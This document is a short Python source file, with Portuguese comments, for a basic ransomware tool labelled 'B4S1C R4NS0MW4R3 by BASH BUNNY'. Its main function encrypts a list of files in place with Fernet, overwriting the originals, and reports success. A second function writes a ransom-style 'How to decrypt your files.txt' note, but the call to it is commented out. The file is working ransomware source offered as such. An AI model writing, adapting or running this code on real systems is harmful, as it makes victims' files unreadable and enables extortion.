from cryptography.fernet import Fernet

# Criar arquivo para descriptografar os arquivos
def createDecryptTxt(directory):
    with open(directory + '/' + 'How to decrypt your files.txt', 'w') as file:
        file.write("Your files have been encrypted by B4S1C R4NS0MW4R3 by BASH BUNNY\n")
        file.write(f"To decrypt your files, run 'python basicransomware.py -p \" {directory} \" --decrypt'")

# Criptografar os arquivos
def run(directory, items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)
    #createDecryptTxt(directory)
    print(f"Todos os arquivos do diretório {directory} foram criptografados com sucesso!")